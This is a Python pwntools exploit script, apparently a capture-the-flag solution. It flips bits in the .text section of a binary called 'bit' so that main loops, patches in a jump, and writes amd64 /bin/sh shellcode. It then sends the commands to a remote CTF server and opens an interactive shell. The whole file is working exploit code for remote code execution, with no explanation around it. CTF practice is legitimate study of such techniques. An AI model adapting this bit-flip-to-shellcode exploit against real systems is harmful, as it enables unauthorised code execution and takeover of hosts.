# coding: utf-8
from pwn import *
context.arch='amd64'
def getCommands(loc, xor_bytes):
    commands = []
    for i,b in enumerate(xor_bytes):
        bin_str = bin(b)[2:]
        print bin_str
        start = len(bin_str)-1
        for j,bit in enumerate(bin_str):
            if bit == '1':
                cmd = "{}:{}".format(hex(loc+i), start-j)
                commands.append(cmd)
                print cmd
    return commands

def CmdsWhatWhere(where,what):
    #Only works for .text addresses
    shell_loc = where
    text = 0x400540
    off_shell = abs(shell_loc-text)+0x540
    current_data = data[off_shell:off_shell+len(what)]
    print "current_data: {}".format(len(current_data))
    current_data += '\x00'*(abs(len(current_data)-len(what)))
    xor_bytes = [ord(x)^ord(y) for x,y in zip(current_data, what)]
    print "Xor: {}, WHat {}, Where {} Current {}".format(xor_bytes, what, where, current_data)
    return getCommands(where, xor_bytes)
    
#raw bytes from file    
data = open('./bit','rb').read()

#cause main to loop by jumping over ret
#This causes the program to segfault eventually because we run out of stack space
loop_main = '0x40072b:4'
cmds = [loop_main]

#better main jump
where = 0x400732 #location of ret
what = '\xe9\xff\xfe\xff\xff'
cmds += CmdsWhatWhere(where, what) + [loop_main]


#r = process('./bit')
r = remote('flatearth.fluxfingers.net', 1744)
#gdb.attach(r, '''
#break *0x400731
#break *0x400741
#break *0x4007b4
#break *0x4007b6
#c
#''')

where =0x400743
what = asm(shellcraft.amd64.linux.sh())
cmds += CmdsWhatWhere(where, what)


#jmp to shellcode
cmds += [loop_main]

for c in cmds:
    r.sendline(c)
r.interactive()
